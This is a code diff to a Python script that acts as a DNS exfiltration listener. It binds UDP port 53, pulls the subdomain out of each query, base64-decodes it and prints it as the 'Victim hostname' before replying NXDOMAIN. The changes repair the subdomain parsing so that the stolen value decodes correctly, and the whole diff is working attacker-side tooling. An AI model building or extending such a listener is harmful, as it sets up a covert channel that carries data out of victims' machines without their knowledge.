@@ -1,7 +1,9 @@
 import socket
 import base64
+import re
 
 def main():
+
    
    #creating a UDP socket, and binding all addresses to listen on 53
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -11,11 +13,15 @@ def main():
     while True:
         data, client_address = server_socket.recvfrom(1024) #gathers client request info
         print(f"Connection from {client_address}")
+
         # Construct DNS response with NXDOMAIN
         response = construct_nxdomain_response(data)
         
+        #There is probably a better way to do this.  Essentially this is grabbing the subdomain that is being passed to our server
         info = parse_dns_query(data)
-        hostname = base64.b64decode(info)
+        result = re.match(r'(.+?)\s*=', info.decode())
+        resp = result.group(1)
+        hostname = base64.b64decode(resp + "=")
         print(f"Victim hostname is: {hostname}")
 
         # Send NXDOMAIN response back to the client
@@ -23,17 +29,13 @@ def main():
     
 def parse_dns_query(data):
     sub = ""
-    # Extract the domain name from the DNS query
+    # Extract the domain name from the DNS query, will parse subdomain later
     domain = b""
-    i = 12  # DNS header is 12 bytes
+    i = 12
     while data[i] != 0:
         domain += data[i:i+1]
         i += 1
-    
-    for i in str(domain):
-        while i != '.':
-            sub += 'i'
-        return sub
+    return domain
 
 def construct_nxdomain_response(data):
     # Grab the transaction ID from the query
